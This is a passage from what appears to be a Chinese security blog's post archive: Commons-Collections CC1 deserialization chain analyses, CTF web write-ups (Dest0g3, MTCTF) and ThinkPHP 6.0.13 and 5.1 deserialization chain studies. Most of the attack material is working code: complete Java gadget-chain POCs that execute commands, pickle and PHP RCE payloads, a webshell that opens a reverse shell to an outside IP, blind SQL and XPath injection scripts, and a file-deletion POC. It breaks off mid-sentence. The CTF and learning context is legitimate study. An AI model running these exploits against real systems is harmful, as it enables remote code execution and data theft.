二：之前那两个if判断 三：最后setValue的参数对象是一个代理类，我们不可控 首先第一个，我们可以利用Runtime.class来序列化，并且将它改写为InvokerTransformer版本调用 Method getRuntimeMethod = (Method) new InvokerTransformer(&quot;getRuntime&quot;, new Class[]{String.class, Class[].class},new Object[]{&quot;getRuntime&quot;,null}).transform(Runtime.class); Runtime runtime = (Runtime) new InvokerTransformer(&quot;invoke&quot;, new Class[]{Object.class, Object.class}, new Object[]{null, null}).transform(getRuntimeMethod); new InvokerTransformer(&quot;exec&quot;, new Class[]{String.class}, new Object[]{&quot;open /System/Applications/Calculator.app&quot;}).transform(runtime); // Class&lt;Runtime&gt; cls = Runtime.class; // Method getRuntimeMethod = cls.getMethod(&quot;getRuntime&quot;,null); // Runtime runtime = (Runtime) getRuntimeMethod.invoke(null, null);// Method execmethod = cls.getMethod(&quot;exec&quot;, String.class);// execmethod.invoke(runtime, &quot;open /System/Applications/Calculator.app&quot;); 然后可以利用ChainedTransformer，做一个递归的调用，减少代码的复用量 Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getMethod&quot;, new Class[]{String.class, Class[].class}, new Object[]{&quot;getRuntime&quot;, null}), new InvokerTransformer(&quot;invoke&quot;, new Class[]{Object.class, Object[].class}, new Object[]{null, null}), new InvokerTransformer(&quot;exec&quot;, new Class[]{String.class}, new Object[]{&quot;open /System/Applications/Calculator.app&quot;}) }; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); chainedTransformer.transform(Runtime.class); 接着第二个问题，if判断，我们下断点 发现第一个memberType判断不过去，因为在这里获取传参注解的成员方法 所以我们知道，我们这里传的是一个override的注解，而他是没有成员方法的，所以过不去第一个判断。 我们可以改成这两个，并且设置hashMap.put中键为value，绕过第二个if 成功进来，但是第三个问题，setValue() 处中的参数不可控，是 AnnotationTypeMismatchExceptionProxy 类 这个时候就要想到之前的ConstantTransformer， 他的transform方法，无论传入什么，他都返回之前构造方法的那个iConstant存的对象 所以我们先传入一个 Runtime.class，然后无论 他的transform() 方法调用任何对象，都会返回 Runtime.class 所以这也就是最终的POC import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.map.TransformedMap;import java.io.*;import java.lang.annotation.Target;import java.lang.reflect.Constructor;import java.lang.reflect.InvocationTargetException;import java.util.HashMap;import java.util.Map;public class CommonsCollections1 { public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException, IOException { Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getMethod&quot;, new Class[]{String.class, Class[].class}, new Object[]{&quot;getRuntime&quot;, null}), new InvokerTransformer(&quot;invoke&quot;, new Class[]{Object.class, Object[].class}, new Object[]{null, null}), new InvokerTransformer(&quot;exec&quot;, new Class[]{String.class}, new Object[]{&quot;open /System/Applications/Calculator.app&quot;}) }; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); HashMap&lt;Object, Object&gt; hashMap = new HashMap&lt;&gt;(); hashMap.put(&quot;value&quot;, &quot;qqw&quot;); Map&lt;Object, Object&gt; transformedMap = TransformedMap.decorate(hashMap, null, chainedTransformer); Class cls = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;); Constructor constructor = cls.getDeclaredConstructor(Class.class, Map.class); constructor.setAccessible(true); Object obj = constructor.newInstance(Target.class,transformedMap); serialize(obj); unserialize(&quot;ser.bin&quot;); } public static void serialize(Object obj) throws IOException { ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;)); oos.writeObject(obj); } public static Object unserialize(String Filename) throws IOException, ClassNotFoundException { ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename)); Object obj = ois.readObject(); return obj; }} 总结 这条链看起来是那么的巧合，让我认识到了我速成的Java基础还是不太行，总之，多调试多分析。 参考https://drun1baby.github.io/2022/06/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8701-CC1%E9%93%BE/#toc-heading-1 https://www.bilibili.com/video/BV1no4y1U7E1/?spm_id_from=333.788&amp;vd_source=18a3ab614a59493e37ea0cb1f984fb56","link":"/2022/11/03/CC1/"},{"title":"CommonsCollections1利用链分析---LazyMap链","text":"前言摆了一两天，补上前面没分析完的CommonsCollections1利用链，这条LazyMap链应该才是正版的CC1链hhh 分析 由上回我们知道，当时找到三条Map链，之前我们找的是TransformedMap，这次我们分析LazyMap。 这个get方法里面也调用了transform，我们继续向上看 发现了这里也有之前出现过的decorate方法，这个类的构造函数是protected，无法直接获取，所以我们又可以通过decorate方法来new一个LazyMap对象。我们构造POC如下 import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.map.LazyMap;import java.lang.reflect.InvocationTargetException;import java.lang.reflect.Method;import java.util.HashMap;import java.util.Map;public class CommonsCollections11 { public static void main(String[] args) throws NoSuchMethodException, InvocationTargetException, IllegalAccessException { Runtime runtime = Runtime.getRuntime(); InvokerTransformer invokerTransformer = new InvokerTransformer(&quot;exec&quot;, new Class[]{String.class}, new Object[]{&quot;open /System/Applications/Calculator.app&quot;}); HashMap&lt;Object, Object&gt; hashMap = new HashMap&lt;&gt;(); Map lazymap = LazyMap.decorate(hashMap, invokerTransformer); Class&lt;LazyMap&gt; lazyClass = LazyMap.class; Method getMethod = lazyClass.getMethod(&quot;get&quot;, Object.class); getMethod.invoke(lazymap, runtime); }} 可以执行，我们继续向上走，看谁调用了get方法，这里我们找到了AnnotationInvocationHandler的invoke() 方法 恰巧这个类里也有readObject方法 但问题是，我们怎么样触发这个invoke方法，这里就要有之前写过的动态代理的知识， 一个类被动态代理了之后，想要通过代理调用这个类的方法，就一定会调用 invoke() 方法。 我们找到之前的entrySet()方法，如果我们把memberValues 改为代理对象，当它调用entrySet的时候，就一定会调用invoke方法。然后完成这条链的利用 我们拿上节的POC来分析 这个就是我们要代理的实例 Class cls = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;); Constructor constructor = cls.getDeclaredConstructor(Class.class, Map.class); constructor.setAccessible(true); InvocationHandler invocationHandler = (InvocationHandler) constructor.newInstance(Target.class, decorateMap); 然后生成代理类 Map proxyMap = (Map) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), new Class[]{Map.class}, invocationHandler); invocationHandler = (InvocationHandler) constructor.newInstance(Target.class, proxyMap); 最终的POC import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.map.LazyMap;import java.io.*;import java.lang.annotation.Target;import java.lang.reflect.*;import java.util.HashMap;import java.util.Map;public class CommonsCollections11 { public static void main(String[] args) throws NoSuchMethodException, InvocationTargetException, IllegalAccessException, ClassNotFoundException, InstantiationException, IOException { Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getMethod&quot;, new Class[]{String.class, Class[].class}, new Object[]{&quot;getRuntime&quot;, null}), new InvokerTransformer(&quot;invoke&quot;, new Class[]{Object.class, Object[].class}, new Object[]{null, null}), new InvokerTransformer(&quot;exec&quot;, new Class[]{String.class}, new Object[]{&quot;open /System/Applications/Calculator.app&quot;}) }; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); HashMap&lt;Object, Object&gt; hashMap = new HashMap&lt;&gt;(); hashMap.put(&quot;value&quot;, &quot;qqw&quot;); Map decorateMap = LazyMap.decorate(hashMap, chainedTransformer); Class cls = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;); Constructor constructor = cls.getDeclaredConstructor(Class.class, Map.class); constructor.setAccessible(true); InvocationHandler invocationHandler = (InvocationHandler) constructor.newInstance(Target.class, decorateMap); Map proxyMap = (Map) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), new Class[]{Map.class}, invocationHandler); invocationHandler = (InvocationHandler) constructor.newInstance(Target.class, proxyMap); serialize(invocationHandler); unserialize(&quot;ser.bin&quot;); } public static void serialize(Object obj) throws IOException { ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;)); oos.writeObject(obj); } public static Object unserialize(String Filename) throws IOException, ClassNotFoundException { ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename)); Object obj = ois.readObject(); return obj; }} 最后再放一下soserial的链子图 总结 再去理解下java的反射机制 多看看其他师傅的分析文章 反序列化的知识 动态代理机制","link":"/2022/11/06/CC11/"},{"title":"Dest0g3 520迎新赛","text":"Web部分 WriteUp phpdest打开给了源码 &lt;?phphighlight_file(__FILE__);require_once 'flag.php';if(isset($_GET['file'])) { require_once($_GET['file']);} 不难注意到，漏洞点应该是出在require_once，搜索发现如下文章 https://www.anquanke.com/post/id/213235 payload php://filter/convert.base64-encode/resource=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php EasyPHP同样给了源码 &lt;?phphighlight_file(__FILE__);include &quot;fl4g.php&quot;;$dest0g3 = $_POST['ctf'];$time = date(&quot;H&quot;);$timme = date(&quot;d&quot;);$timmme = date(&quot;i&quot;);if(($time &gt; &quot;24&quot;) or ($timme &gt; &quot;31&quot;) or ($timmme &gt; &quot;60&quot;)){ echo $fl4g;}else{ echo &quot;Try harder!&quot;;}set_error_handler( function() use(&amp;$fl4g) { print $fl4g; });$fl4g .= $dest0g3;?&gt; 简单分析下可以发现，只要触发set_error_handler就可以获得flag 因为下面有个字符串拼接，传入数组即可报错，触发这个函数 SimpleRCE还是给源码，可以进行命令执行 &lt;?phphighlight_file(__FILE__);$aaa=$_POST['aaa'];$black_list=array('^','.','`','&gt;','&lt;','=','&quot;','preg','&amp;','|','%0','popen','char','decode','html','md5','{','}','post','get','file','ascii','eval','replace','assert','exec','$','include','var','pastre','print','tail','sed','pcre','flag','scan','decode','system','func','diff','ini_','passthru','pcntl','proc_open','+','cat','tac','more','sort','log','current','\\\\','cut','bash','nl','wget','vi','grep');$aaa = str_ireplace($black_list,&quot;hacker&quot;,$aaa);eval($aaa);?&gt; 考虑到过滤了这么多玩意，第一个想到的就是无字母数字绕过正则 参考yu师傅这篇文章https://blog.csdn.net/miuzzx/article/details/109143413?spm=1001.2014.3001.5502 funny_upload学习到了.htaccess的新用法，以及配合伪协议绕过内容过滤 首先利用base64编码绕过内容过滤 然后.htaccess解析配合伪协议读取 Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;.htaccess&quot;Content-Type: image/jpegSetHandler application/x-httpd-phpphp_value auto_append_file &quot;php://filter/convert.base64-decode/resource=lnk.jpg&quot; 但是执行命令的时候发现，没有回显，考虑到disable_function过滤了 利用file_get_contents 猜测flag也在根目录 EasySSTI登录进去后，username处回显，根据题目，试试ssti 成功，但是简单fuzz了一下，基本上一些常见的关键字都被过滤了，包括. ' &quot; [ _还有空格 看了wp知道利用set可以得到关键字绕过 poc是一样的，不过burp要发两次包，第一次设置变量，会导致500的报错，第二次就出flag，其中空格用%0a绕过一下 middlepickle反序列化，但是限制了只有config类，以及调用的属性方法中不包含__ import osimport configfrom flask import Flask, request, session, render_template, url_for,redirect,make_responseimport pickleimport ioimport sysimport base64app = Flask(__name__)class RestrictedUnpickler(pickle.Unpickler): def find_class(self, module, name): if module in ['config'] and &quot;__&quot; not in name: return getattr(sys.modules[module], name) raise pickle.UnpicklingError(&quot;global '%s.%s' is forbidden&quot; % (module, name))def restricted_loads(s): return RestrictedUnpickler(io.BytesIO(s)).load()@app.route('/')def show(): base_dir = os.path.dirname(__file__) resp = make_response(open(os.path.join(base_dir, __file__)).read()+open(os.path.join(base_dir, &quot;config/__init__.py&quot;)).read()) resp.headers[&quot;Content-type&quot;] = &quot;text/plain;charset=UTF-8&quot; return resp@app.route('/home', methods=['POST', 'GET'])def home(): data=request.form['data'] User = restricted_loads(base64.b64decode(data)) return str(User)if __name__ == '__main__': app.run(host='0.0.0.0', debug=True, port=5000)import osdef backdoor(cmd): # 这里我也改了一下 if isinstance(cmd,list) : s=''.join(cmd) print(&quot;!!!!!!!!!!&quot;) s=eval(s) return s else: print(&quot;??????&quot;) 但是给了一个backdoor后门函数，我们用pker构造一下 cfbk = GLOBAL('config', 'backdoor')cfbk([&quot;__import__('os').popen('cat /flag.txt').read()&quot;])return 可以执行命令 ezip图片里藏着源码 upload.php:&lt;?phperror_reporting(0);include(&quot;zip.php&quot;);if(isset($_FILES['file']['name'])){ if(strstr($_FILES['file']['name'],&quot;..&quot;)||strstr($_FILES['file']['name'],&quot;/&quot;)){ echo &quot;hacker!!&quot;; exit; } if(pathinfo($_FILES['file']['name'], PATHINFO_EXTENSION)!=&quot;zip&quot;){ echo &quot;only zip!!&quot;; exit; } $Myzip = new zip($_FILES['file']['name']); mkdir($Myzip-&gt;path); move_uploaded_file($_FILES['file']['tmp_name'], './'.$Myzip-&gt;path.'/' . $_FILES['file']['name']); echo &quot;Try to unzip your zip to /&quot;.$Myzip-&gt;path.&quot;&lt;br&gt;&quot;; if($Myzip-&gt;unzip()){echo &quot;Success&quot;;}else{echo &quot;failed&quot;;}}zip.php:&lt;?phpclass zip{ public $zip_name; public $path; public $zip_manager; public function __construct($zip_name){ $this-&gt;zip_manager = new ZipArchive(); $this-&gt;path = $this-&gt;gen_path(); $this-&gt;zip_name = $zip_name; } public function gen_path(){ $chars=&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&quot;; $newchars=str_split($chars); shuffle($newchars); $chars_key=array_rand($newchars,15); $fnstr = &quot;&quot;; for($i=0;$i&lt;15;$i++){ $fnstr.=$newchars[$chars_key[$i]]; } return md5($fnstr.time().microtime()*100000); } public function deldir($dir) { //先删除目录下的文件： $dh = opendir($dir); while ($file = readdir($dh)) { if($file != &quot;.&quot; &amp;&amp; $file!=&quot;..&quot;) { $fullpath = $dir.&quot;/&quot;.$file; if(!is_dir($fullpath)) { unlink($fullpath); } else { $this-&gt;deldir($fullpath); } } } closedir($dh); } function dir_list($directory) { $array = []; $dir = dir($directory); while ($file = $dir-&gt;read()) { if ($file !== '.' &amp;&amp; $file !== '..') { $array[] = $file; } } return $array; } public function unzip() { $fullpath = &quot;/var/www/html/&quot;.$this-&gt;path.&quot;/&quot;.$this-&gt;zip_name; $white_list = ['jpg','png','gif','bmp']; $this-&gt;zip_manager-&gt;open($fullpath); for ($i = 0;$i &lt; $this-&gt;zip_manager-&gt;count();$i ++) { if (strstr($this-&gt;zip_manager-&gt;getNameIndex($i),&quot;../&quot;)){ echo &quot;you bad bad&quot;; return false; } } if(!$this-&gt;zip_manager-&gt;extractTo($this-&gt;path)){ echo &quot;Unzip to /&quot;.$this-&gt;path.&quot;/ failed&quot;; exit; } @unlink($fullpath); $file_list = $this-&gt;dir_list(&quot;/var/www/html/&quot;.$this-&gt;path.&quot;/&quot;); for($i=0;$i&lt;sizeof($file_list);$i++){ if(is_dir($this-&gt;path.&quot;/&quot;.$file_list[$i])){ echo &quot;dir? I deleted all things in it&quot;.&quot;&lt;br&gt;&quot;;@$this-&gt;deldir(&quot;/var/www/html/&quot;.$this-&gt;path.&quot;/&quot;.$file_list[$i]);@rmdir(&quot;/var/www/html/&quot;.$this-&gt;path.&quot;/&quot;.$file_list[$i]); } else{ if(!in_array(pathinfo($file_list[$i], PATHINFO_EXTENSION),$white_list)) {echo &quot;only image!!! I deleted it for you&quot;.&quot;&lt;br&gt;&quot;;@unlink(&quot;/var/www/html/&quot;.$this-&gt;path.&quot;/&quot;.$file_list[$i]);} } } return true; }} 通过出发unzip的报错，可以执行php代码 首先写入一个webshell &lt;?php system(&quot;bash -c 'bash -i &gt;&amp; /dev/tcp/121.xxx.xxx.xxx/2333 0&gt;&amp;1'&quot;);?&gt; 然后 上传访问，得到反弹回来的shell 尝试suid提权，可以利用nl命令 Really Easy SQL钓鱼站，可能就是纯粹用来记录的，insert注入 hint给了黑名单 $black_list=array('union','updatexml','order','by','substr',' ','and','extractvalue',';','sleep','join','alter','handler','char','+','/','like','regexp','offset','sleep','case','&amp;','-','hex','%0','load’); 利用benchmark代替sleep，%0a代替空格 import timeimport requests# $black_list=array('union','updatexml','order','by','substr',' ','and','extractvalue',';','sleep','join','alter','handler','char','+','/','like','regexp','offset','sleep','case','&amp;','-','hex','%0','load’);url = &quot;http://2f597fa9-55a9-4661-abfb-d700be2f5a7c.node4.buuoj.cn:81/index.php&quot;string = [ord(i) for i in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789,{}-']res = ''for i in range(1, 60): for j in string: time.sleep(1) #payload = f&quot;username='or(if((ascii(right((select%a0group_concat(schema_name)%a0from%a0information_schema.schemata),{i}))='{j}'),(benchmark(2999999,md5('test'))),0))or'&amp;password=a&amp;submit=&quot; #payload = f&quot;username='or(if((ascii(right((select%a0group_concat(table_name)%a0from%a0information_schema.tables%a0where%a0table_schema='ctf'),{i}))='{j}'),(benchmark(2999999,md5('test'))),0))or'&amp;password=a&amp;submit=&quot; #payload = f&quot;username='or(if((ascii(right((select%a0group_concat(column_name)%a0from%a0information_schema.columns%a0where%a0table_name='flaggg'),{i}))='{j}'),(benchmark(2999999,md5('test'))),0))or'&amp;password=a&amp;submit=&quot; payload = f&quot;username='or(if((ascii(right((select%a0group_concat(cmd)%a0from%a0ctf.flaggg),{i}))='{j}'),(benchmark(2999999,md5('test'))),0))or'&amp;password=a&amp;submit=&quot; try: headers = {'Content-Type':'application/x-www-form-urlencoded'} requests.post(url=url, data=payload, headers=headers, timeout=1.5) except: res = chr(j)+res print(res) break Easy SQL和上一题一样的","link":"/2022/05/30/Dest0g3/"},{"title":"MTCTF2022","text":"周末打的MTCTF easypickle又是pickle，上次学的忘得差不多了，平时基本上没碰到过 给了源码 import base64import picklefrom flask import Flask, sessionimport osimport randomapp = Flask(__name__)app.config['SECRET_KEY'] = os.urandom(2).hex()@app.route('/')def hello_world(): if not session.get('user'): session['user'] = ''.join(random.choices(&quot;admin&quot;, k=5)) return 'Hello {}!'.format(session['user'])@app.route('/admin')def admin(): if session.get('user') != &quot;admin&quot;: return f&quot;&lt;script&gt;alert('Access Denied');window.location.href='/'&lt;/script&gt;&quot; else: try: a = base64.b64decode(session.get('ser_data')).replace(b&quot;builtin&quot;, b&quot;BuIltIn&quot;).replace(b&quot;os&quot;, b&quot;Os&quot;).replace(b&quot;bytes&quot;, b&quot;Bytes&quot;) if b'R' in a or b'i' in a or b'o' in a or b'b' in a: raise pickle.UnpicklingError(&quot;R i o b is forbidden&quot;) pickle.loads(base64.b64decode(session.get('ser_data'))) return &quot;ok&quot; except: return &quot;error!&quot;if __name__ == '__main__': app.run(host='0.0.0.0', port=8888) 首先是这个secret_key是一个4位的十六进制 然后下面这个路由 @app.route('/')def hello_world(): if not session.get('user'): session['user'] = ''.join(random.choices(&quot;admin&quot;, k=5)) return 'Hello {}!'.format(session['user']) 如果没有session，就从admin中取，这里参考团队师傅的脚本，爆出admin的cookie import requestsurl = &quot;http://127.0.0.1:5000/&quot;while True: resp = requests.get(url=url) if &quot;admin&quot; in resp.text: print(resp.cookies) break 然后我们就可以利用flask-unsign进行对key的爆破 首先先生成一下字典 hexs = ['0','1','2','3','4','5','6','7','8','9','a','b','c','d','e','f']with open(&quot;./1.txt&quot;, &quot;a&quot;) as f: for i in hexs: for j in hexs: for m in hexs: for n in hexs: str = &quot;{}{}{}{}\\n&quot;.format(i, j, m, n) print(str) f.write(str) 接着就是要绕过反序列化执行命令了 a = base64.b64decode(session.get('ser_data')).replace(b&quot;builtin&quot;, b&quot;BuIltIn&quot;).replace(b&quot;os&quot;, b&quot;Os&quot;).replace(b&quot;bytes&quot;, b&quot;Bytes&quot;) if b'R' in a or b'i' in a or b'o' in a or b'b' in a: raise pickle.UnpicklingError(&quot;R i o b is forbidden&quot;) pickle.loads(base64.b64decode(session.get('ser_data'))) 这个ser_data是从session里取的，所以我们要伪造session传入pcikle反序列化的数据，同时他也限制了R i o b四个操作符 注意看，他这里最后load的是ser_data，而不是a 所以这个waf的逻辑是有问题的 先用a去获得替换关键字的opcode 然后替换后的去判断 但是最后执行的却是原先的值 我们利用如下payload import base64import pickletoolspayload = b'''(S'key'\\nS'val'\\ndS'pay'\\n(cos\\nsystem\\nV反弹shell\\nos.'''print(pickletools.dis(payload))print(base64.b64encode(payload)) 执行命令选用的是反弹shell，然后因为有waf，我们可以采用V指令，进行unicode编码绕过 发包过去，成功收到shell babyjavaxpath盲注，这里本地没环境了，贴下其他师傅的脚本 https://pysnow.cn/archives/394/ # -*- coding: utf-8 -*-# @Time : 2022/9/17 14:00# @Author : pysnowimport stringimport requestsurl = 'http://eci-2ze1m6bqazd6qr453ll7.cloudeci1.ichunqiu.com:8888/hello'dic = 'flagbcdef-_{}0123456789'ses = requests.session()result = ''# data = {&quot;xpath&quot;: &quot;admin' or substring(name(/root/user), &quot; + str(i) + &quot;, 1)='&quot; + j}# root user username# /root/user/for i in range(29, 50): print(i) for j in dic: data = {&quot;xpath&quot;: &quot;admin' or substring((/root/user/*[2]), &quot; + str(i) + &quot;, 1)='&quot; + j} res = ses.post(url=url, data=data) if 'available' not in res.text: result += j print(result) break https://mp.weixin.qq.com/s/JuR0OL4Wv9SLCVFd71vuKA import requests as resimport stringurl = &quot;http://eci-2zeetzz54w4b5tinoysb.cloudeci1.ichunqiu.com:8888/hello&quot;strs = &quot;{-}&quot; + string.ascii_letters + string.digits result = &quot;&quot;end = Falsefor a in range(1,100): if end: print(&quot;[+]Done!: {}&quot;.format(result)) break for i in strs: print(&quot;[+]Test:{} {}&quot;.format(a,i)) # data = {&quot;xpath&quot; : &quot;1'or substring(name(/*[1]), {}, 1)='{}' and '1'='1&quot;.format(a,i)} # data = {&quot;xpath&quot; : &quot;1'or substring(name(/root/*[1]), {}, 1)='{}' and '1'='1&quot;.format(a,i)} # data = {&quot;xpath&quot; : &quot;1'or substring(name(/root/user/*[2]), {}, 1)='{}' and '1'='1&quot;.format(a,i)} data = {&quot;xpath&quot; : &quot;1'or substring(/root/user/username[position()=2]/text(), {}, 1)='{}' and '1'='1&quot;.format(a,i)} resp = res.post(url=url, data=data) # print(resp.text) if resp.text.find(&quot;&lt;p&gt;user1&lt;/p&gt;&quot;) != -1: result += i print(&quot;[+]Matched: &quot; + result) break if i == strs[len(strs)-1:]: end = True","link":"/2022/09/20/MTCTF/"},{"title":"TP6.0.13反序列化简单分析","text":"看到最新的TP爆了一个反序列化的RCE，看着ZAC师傅文章分析一下 准备原始POC链接https://github.com/top-think/framework/issues/2749 下一下源码 composer create-project topthink/think tp 这次用Phpstorm来调试分析，配置教程依然参考国光师傅的。 采取POC+动调 分析先上POC &lt;?phpnamespace League\\Flysystem\\Cached\\Storage{ class Psr6Cache{ private $pool; protected $autosave = false; public function __construct($exp) { $this-&gt;pool = $exp; } }}namespace think\\log{ class Channel{ protected $logger; protected $lazy = true; public function __construct($exp) { $this-&gt;logger = $exp; $this-&gt;lazy = false; } }}namespace think{ class Request{ protected $url; public function __construct() { $this-&gt;url = '&lt;?php system(\\'open /System/Applications/Calculator.app\\'); exit(); ?&gt;'; } } class App{ protected $instances = []; public function __construct() { $this-&gt;instances = ['think\\Request'=&gt;new Request()]; } }}namespace think\\view\\driver{ class Php{}}namespace think\\log\\driver{ class Socket{ protected $config = []; protected $app; protected $clientArg = []; public function __construct() { $this-&gt;config = [ 'debug'=&gt;true, 'force_client_ids' =&gt; 1, 'allow_client_ids' =&gt; '', 'format_head' =&gt; [new \\think\\view\\driver\\Php,'display'], # 利用类和方法 ]; $this-&gt;app = new \\think\\App(); $this-&gt;clientArg = ['tabid'=&gt;'1']; } }}namespace{ $c = new think\\log\\driver\\Socket(); $b = new think\\log\\Channel($c); $a = new League\\Flysystem\\Cached\\Storage\\Psr6Cache($b); echo urlencode(serialize($a));} 把这个小电话开启，我们直接打入POC，断点断在__destruct方法里 然后我们单步跟进save方法 这里的pool现在是Channel类，然后调用getItem方法，我们跟进会发现，Channel类中没有getItem方法，所以会调用__call方法 接着就是调用log，然后log又调用record，然后跟进发现它又调用一个save 此时我们看到，logger是指向Socket类，而后调用save也就是Socket中的save方法 然后就一路跟，一直到request调用url解析了我们执行的命令，其中http://是通过domain和scheme函数得到的 然后执行到了invokeMethod 跟进后，reflect被传入类Php，方法是display，然后调用invokeArgs方法 这个invokeArgs可以带参数执行 所以继续跟进，它就会去执行Php类中的display方法 执行完，成功弹出了计算器 这不算是复现这条链子，主要是熟悉下调试流程，分析代码执行过程。","link":"/2022/09/24/TP6013/"},{"title":"Thinkphp5.1.x反序列化学习","text":"前言是NU1L那本书配套的一道题，在BUU上有，链接下载下来就是Thinkphp5.1的源码，网上有很多对应的POC以及分析，刚好最近也是在学习代码审计，以前没有复现过这么难的，这次就抱着学习的心态来尝试一下。 相关环境配置因为之前也没咋审计过代码，所以这次就顺便把环境也一起配好了，方便以后学习。这里我是参考国光师傅的配置 macOS 下优雅地配置 PHP 代码审计环境 我主要是配置了vscode的环境，phpstorm有点麻烦。 分析利用链首先我们全局搜__destruct方法，找到个在Windows.php里然后发现调用removeFiles方法，跟进去看 private function removeFiles() { foreach ($this-&gt;files as $filename) { if (file_exists($filename)) { @unlink($filename); //测试删除文件 echo &quot;removed&quot;; } } $this-&gt;files = []; } 发现存在一个任意文件删除的漏洞，因为buu的环境本身存在一个反序列化的点，所以我们不用先写一个控制器 POC如下 &lt;?phpnamespace think\\process\\pipes;class Pipes{}class Windows extends Pipes{ private $files = []; public function __construct() { $this-&gt;files=['/tmp/kk.txt']; }}echo urlencode(serialize(new Windows())); 删除成功 接着继续看RCE的链子，接下来就是要通过file_exists函数去触发__toString，因为当一个对象被反序列化后又被当做字符串使用时会触发这个方法，这里找到的是在Conversion.php里，然后一直跟进，跟到toArray()方法， public function toArray() { $item = []; $hasVisible = false; foreach ($this-&gt;visible as $key =&gt; $val) { if (is_string($val)) { if (strpos($val, '.')) { list($relation, $name) = explode('.', $val); $this-&gt;visible[$relation][] = $name; } else { $this-&gt;visible[$val] = true; $hasVisible = true; } unset($this-&gt;visible[$key]); } } foreach ($this-&gt;hidden as $key =&gt; $val) { if (is_string($val)) { if (strpos($val, '.')) { list($relation, $name) = explode('.', $val); $this-&gt;hidden[$relation][] = $name; } else { $this-&gt;hidden[$val] = true; } unset($this-&gt;hidden[$key]); } } // 合并关联数据 $data = array_merge($this-&gt;data, $this-&gt;relation); foreach ($data as $key =&gt; $val) { if ($val instanceof Model || $val instanceof ModelCollection) { // 关联模型对象 if (isset($this-&gt;visible[$key]) &amp;&amp; is_array($this-&gt;visible[$key])) { $val-&gt;visible($this-&gt;visible[$key]); } elseif (isset($this-&gt;hidden[$key]) &amp;&amp; is_array($this-&gt;hidden[$key])) { $val-&gt;hidden($this-&gt;hidden[$key]); } // 关联模型对象 if (!isset($this-&gt;hidden[$key]) || true !== $this-&gt;hidden[$key]) { $item[$key] = $val-&gt;toArray(); } } elseif (isset($this-&gt;visible[$key])) { $item[$key] = $this-&gt;getAttr($key); } elseif (!isset($this-&gt;hidden[$key]) &amp;&amp; !$hasVisible) { $item[$key] = $this-&gt;getAttr($key); } } // 追加属性（必须定义获取器） if (!empty($this-&gt;append)) { foreach ($this-&gt;append as $key =&gt; $name) { if (is_array($name)) { // 追加关联对象属性 $relation = $this-&gt;getRelation($key); if (!$relation) { $relation = $this-&gt;getAttr($key); if ($relation) { $relation-&gt;visible($name); } } $item[$key] = $relation ? $relation-&gt;append($name)-&gt;toArray() : []; } elseif (strpos($name, '.')) { list($key, $attr) = explode('.', $name); // 追加关联对象属性 $relation = $this-&gt;getRelation($key); if (!$relation) { $relation = $this-&gt;getAttr($key); if ($relation) { $relation-&gt;visible([$attr]); } } $item[$key] = $relation ? $relation-&gt;append([$attr])-&gt;toArray() : []; } else { $item[$name] = $this-&gt;getAttr($name, $item); } } } return $item; } 这个方法我们主要是要执行到$relation-&gt;visible($name);这句，因为当我们控制$relation为类对象，去调用这个不存在的visible方法，就会触发__call方法，而它一般又会存在__call_user_func和__call_user_func_array，PHP代码RCE的点一般也就在这里。 但是要执行到这句，我们首先要满足 !empty($this-&gt;append) is_array($name) $relation = $this-&gt;getRelation($key); 返回空 $relation = $this-&gt;getAttr($key); 不返回空 append可控，我们传值不为空就好，主要看后面的 跟进getRelation方法 public function getRelation($name = null){ if (is_null($name)) { return $this-&gt;relation; } elseif (array_key_exists($name, $this-&gt;relation)) { return $this-&gt;relation[$name]; } return;} 这里我们是从toArray里传入了$key，为了直接return;,我们保证$key不在relation数组里就好 接着跟进getAttr方法 public function getAttr($name, &amp;$item = null) { try { $notFound = false; $value = $this-&gt;getData($name); } catch (InvalidArgumentException $e) { $notFound = true; $value = null; } ....省略 return $value; } 从try/catch中取得$value并且返回，所以我们又要跟进getData public function getData($name = null){ if (is_null($name)) { return $this-&gt;data; } elseif (array_key_exists($name, $this-&gt;data)) { return $this-&gt;data[$name]; } elseif (array_key_exists($name, $this-&gt;relation)) { return $this-&gt;relation[$name]; } throw new InvalidArgumentException('property not exists:' . static::class . '-&gt;' . $name);} 这个$name就是之前$key，然后判断是否在他的data数组和relation数组中再返回结果，这里我们的$this-&gt;data是可控的，在Attribute中。所以我们最终$relation=$this-&gt;data[$key] 当$relation为一个对象时，就可以进行调用类中的 